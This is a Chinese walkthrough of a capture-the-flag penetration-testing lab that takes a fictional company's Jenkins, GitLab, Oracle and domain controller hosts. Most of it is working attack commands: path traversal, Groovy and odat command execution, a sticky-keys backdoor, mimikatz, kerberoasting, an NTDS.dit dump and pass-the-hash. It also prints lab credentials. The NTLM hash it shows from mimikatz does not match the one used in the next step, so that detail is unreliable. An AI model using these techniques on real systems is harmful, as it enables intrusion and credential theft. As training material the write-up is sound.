# 春秋云境-Privilege综合渗透


春秋云境-Privilege综合渗透通关wp

<!--more-->

![image-20250114161021987](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114161021987.png?imageSlim)靶标介绍：在这个靶场中，您将扮演一名资深黑客，被雇佣来评估虚构公司 XR Shop 的网络安全。您需要通过渗透测试逐个击破公司暴露在公网的应用，并通过后渗透技巧深入 XR Shop 的内部网络，寻找潜在的弱点和漏洞，并通过滥用 Windows 特权获取管理员权限，最终并获取隐藏在其内部的核心机密。该靶场共有 4 个 Flag，分布于不同的靶机。

* Wordpress
* Gitlab
* Kerberos
* 内网渗透
* Privilege Elevation

‍

### 第一关

关卡剧情：  
请获取 XR Shop 官网源码的备份文件，并尝试获得系统上任意文件读取的能力。并且，管理员在配置 Jenkins 时，仍然选择了使用初始管理员密码，请尝试读取该密码并获取 Jenkins 服务器权限。Jenkins 配置目录为 C:\ProgramData\Jenkins\.jenkins。

fscan扫描

```bash
[root@iZ2ze file]# ./fscan -h 39.99.137.59
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4               
start infoscan
39.99.137.59:445 open
39.99.137.59:135 open
39.99.137.59:80 open
39.99.137.59:139 open
39.99.137.59:3306 open
39.99.137.59:8080 open
[*] alive ports len is: 6
start vulscan
[*] NetInfo 
[*]39.99.137.59
   [->]XR-JENKINS
   [->]172.22.14.7
[*] WebTitle http://39.99.137.59:8080  code:403 len:548    title:None
[*] WebTitle http://39.99.137.59       code:200 len:54646  title:XR SHOP
[+] PocScan http://39.99.137.59/www.zip poc-yaml-backup-file
已完成 6/6
[*] 扫描结束,耗时: 44.104825753s
```

发现源码备份http://39.99.137.59/www.zip，访问拿到源码

在wp-config.php文件中发现数据库账号密码，尝试连接不成功，应该是不允许其他主机连接

`tools/content-log.php`​下发现了存在任意文件读取漏洞

根据题目描述我们获取到了Jekins根目录为`C:\ProgramData\Jenkins\.jenkins`​，然后我们这里搜索过后可以发现初始密码路径

读取`C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword`​

```bash
http://39.99.137.59/tools/content-log.php?logfile=../../../../../../../../../ProgramData/Jenkins/.jenkins/secrets/initialAdminPassword
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114135458-529m7u2.png?imageSlim)​

访问http://39.99.137.59:8080/，进行登录

```bash
admin/510235cf43f14e83b88a9f144199655b
```

发现groovy脚本执行接口

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114135617-x2w6cfs.png?imageSlim)​

进行添加用户

```bash
println "net user ttest Test@123 /add".execute().text
println "net localgroup administrators ttest /add".execute().text
```

rdp连上去，读取flag01

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114135855-hlmc931.png?imageSlim)​

### 第二关

关卡剧情：管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。

上传fscan，frp，扫内网，搭代理

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114140811-4lotfex.png?imageSlim)​

fscan

```bash
C:\Users\ttest\Downloads>fscan.exe -h 172.22.14.7/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.14.7     is alive
(icmp) Target 172.22.14.11    is alive
(icmp) Target 172.22.14.16    is alive
(icmp) Target 172.22.14.31    is alive
(icmp) Target 172.22.14.46    is alive
[*] Icmp alive hosts len is: 5
172.22.14.11:445 open
172.22.14.7:445 open
172.22.14.7:135 open
172.22.14.46:139 open
172.22.14.31:139 open
172.22.14.11:139 open
172.22.14.46:135 open
172.22.14.31:135 open
172.22.14.7:139 open
172.22.14.11:135 open
172.22.14.46:80 open
172.22.14.16:80 open
172.22.14.7:80 open
172.22.14.16:22 open
172.22.14.16:8060 open
172.22.14.11:88 open
172.22.14.46:445 open
172.22.14.31:445 open
172.22.14.7:8080 open
172.22.14.31:1521 open
172.22.14.7:3306 open
172.22.14.16:9094 open
[*] alive ports len is: 22
start vulscan
[*] NetInfo
[*]172.22.14.7
   [->]XR-JENKINS
   [->]172.22.14.7
[*] NetInfo
[*]172.22.14.46
   [->]XR-0923
   [->]172.22.14.46
[*] NetInfo
[*]172.22.14.11
   [->]XR-DC
   [->]172.22.14.11
[*] NetInfo
[*]172.22.14.31
   [->]XR-ORACLE
   [->]172.22.14.31
[*] NetBios 172.22.14.46    XIAORANG\XR-0923
[*] NetBios 172.22.14.31    WORKGROUP\XR-ORACLE
[*] NetBios 172.22.14.11    [+] DC:XIAORANG\XR-DC
[*] WebTitle http://172.22.14.7:8080   code:403 len:548    title:None
[*] WebTitle http://172.22.14.16:8060  code:404 len:555    title:404 Not Found
[*] WebTitle http://172.22.14.7        code:200 len:54603  title:XR SHOP
[*] WebTitle http://172.22.14.46       code:200 len:703    title:IIS Windows Server
[*] WebTitle http://172.22.14.16       code:302 len:99     title:None 跳转url: http://172.22.14.16/users/sign_in
[*] WebTitle http://172.22.14.16/users/sign_in code:200 len:34961  title:Sign in · GitLab
[+] PocScan http://172.22.14.7/www.zip poc-yaml-backup-file
已完成 22/22
```

其中

```bash
172.22.14.7 （XR-JENKINS）（已经拿下）
172.22.14.46 （XR-0923）
172.22.14.11 （XR-DC）
172.22.14.31 （XR-ORACLE）
172.22.14.16 （GitLab）
```

gitlab在http://172.22.14.16

frp穿透出来

根据关卡剧情获取到API token

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114142030-fs5dh43.png?imageSlim)​

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114142106-tz71q5v.png?imageSlim)​

回到脚本控制台获取对应的明文，获得gitlab PRIVATE-TOKENgitlab PRIVATE-TOKEN

![image-20250114161658578](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114161658578.png?imageSlim)

（无法将其push到github，只能转为图片push）

```bash
println(hudson.util.Secret.fromString("{上述字符串}").getPlainText())
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114142316-hw8glvg.png?imageSlim)​

```bash
glpat-7kD_qLH2PiQv_ywB9hz2
```

（极狐API信息泄露）

使用 Access Token 去请求 GitLab API，返回所有的项目列表：

```bash
proxychains4 curl --header "PRIVATE-TOKEN:glpat-7kD_qLH2PiQv_ywB9hz2" "http://172.22.14.16/api/v4/projects" |jq  |grep "http_url_to_repo"
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114143329-nrji4e8.png?imageSlim)​

git clone下来

```bash
proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git
proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git
proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/awenode.git
proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git
proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/gitlab-instance-23352f48/Monitoring.git
```

在xradmin/ruoyi-admin/src/main/resources/application-druid.yml找到Oracle的账密

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114143647-1g34tr4.png?imageSlim)​

```bash
                url: jdbc:oracle:thin:@172.22.14.31:1521/orcl
                username: xradmin
                password: fcMyE8t9E4XdsKf
```

用odat打oracle

```bash
proxychains4 odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net user ttest Test@123 /add'
proxychains4 odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net localgroup administrators ttest /add'
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114145631-yxfciuz.png?imageSlim)​

随后rdp连过去读flag

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114150005-6dptfh1.png?imageSlim)​

### 第三关

关卡剧情：攻击办公区内网，获取办公 PC 控制权限，并通过特权滥用提升至 SYSTEM 权限。

在internal-secret/credentials.txt里找到XR-0923的账密

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114150135-ih2pys6.png?imageSlim)​

```bash
zhangshuai/wSbEajHzZs
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114150331-5ijqzbn.png?imageSlim)​

rdp连过去之后发现权限较低，无法读取flag

```bash
net user zhangshuai
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114150606-6tcdqye.png?imageSlim)​

发现zhangshuai是Remote Management Use组的

可以参考[https://forum.butian.net/share/2080](https://forum.butian.net/share/2080)

使用`evil-winrm`​连接此机器

```bash
proxychains evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114150752-sp4jzf0.png?imageSlim)​

```bash
whoami /priv
```

可以发现再查看用户权限，发现多了一个`SeRestorePrivilege`​

SeRestorePrivilege提权,参考:

[https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8)

可以了解到`SeRestorePrivilege`​授予对系统上所有对象的写访问权，而不管它们的ACL如何。此时我们就可以通过三种方式达到滥用特权的目的：

```bash
1、修改服务二进制文件
2、覆盖系统进程使用的DLL
3、修改注册表设置
```

尝试粘滞键提权

```bash
ren C://windows/system32/sethc.exe C://windows/system32/sethc.bak
ren C://windows/system32/cmd.exe C://windows/system32/sethc.exe
```

回到rdp锁定用户，在登录处按5下shift触发粘滞键弹出cmd拿到SYSTEM

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114151043-277ukgz.png?imageSlim)​

随后切换到对应目录读取flag

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114151211-id8ypv4.png?imageSlim)​

### 第四关

关卡剧情：尝试接管备份管理操作员帐户，并通过转储 NTDS 获得域管理员权限，最终控制整个域环境。

创建个管理员用户rdp上去

```bash
net user ttest Test@123 /add
net localgroup administrators ttest /add
```

传个猕猴桃上去，以管理员权限运行导出哈希

```bash
privilege::debug
sekurlsa::logonpasswords
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114152745-jcvx2j1.png?imageSlim)​

拿到XR-0923$的ntlm哈希

```bash
b76b9e077e8d1f117310a4e1eb50be45
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114153023-ql8hrmy.png?imageSlim)​

打kerberoasting

```bash
proxychains4 impacket-GetUserSPNs xiaorang.lab/'XR-0923$' -hashes ':a5ac13ae0abc9935a13e81c88f638494' -dc-ip 172.22.14.11
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114153452-v3rasbl.png?imageSlim)​

抓取tianjing的hash，写入hash.txt

```bash
proxychains4 impacket-GetUserSPNs xiaorang.lab/'XR-0923$' -hashes ':a5ac13ae0abc9935a13e81c88f638494' -dc-ip 172.22.14.11 -request-user tianjing
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114153627-ic76b17.png?imageSlim)​

使用hashcat进行密码爆破

```bash
hashcat -a 0 -m 13100 hash.txt rockyou.txt
```

得到tianjing密码是DPQSXSXgh2

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114153849-8j0icra.png?imageSlim)​

`evil-winrm`​连一下

```bash
proxychains4 evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2 
```

whoami /priv查看用户权限，发现又多一个SeBackupPrivilege

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114153959-vepohlb.png?imageSlim)​

kali上新建一个raj.dsh，内容如下

```bash
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```

再用unix2dos将dsh文件的编码间距转换为Windows兼容的编码和间距

```bash
unix2dos raj.dsh
```

在`C:/`​下随便创个目录，上传raj.dsh

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114154731-8iqoqtm.png?imageSlim)​

卷影拷贝

```bash
diskshadow /s raj.dsh
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114154809-8z2abqi.png?imageSlim)​

下载ntds.dit和system到kali上

```bash
RoboCopy /b z:\windows\ntds . ntds.dit
download ntds.dit
reg save HKLM\SYSTEM system
download system
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114154945-6aojrem.png?imageSlim)​

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114155803-tqdv1y1.png?imageSlim)​

解密出administrator的hash

```bash
impacket-secretsdump -ntds ntds.dit -system system local
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114160447-94bwrah.png?imageSlim)​

打pth，winrm上去

```bash
proxychains4 evil-winrm -i 172.22.14.11 -u Administrator -H "70c39b547b7d8adec35ad7c09fb1d277"
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114160545-agwbh3w.png?imageSlim)​

到对应位置读取flag

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250114160645-8dcmr2l.png?imageSlim)​

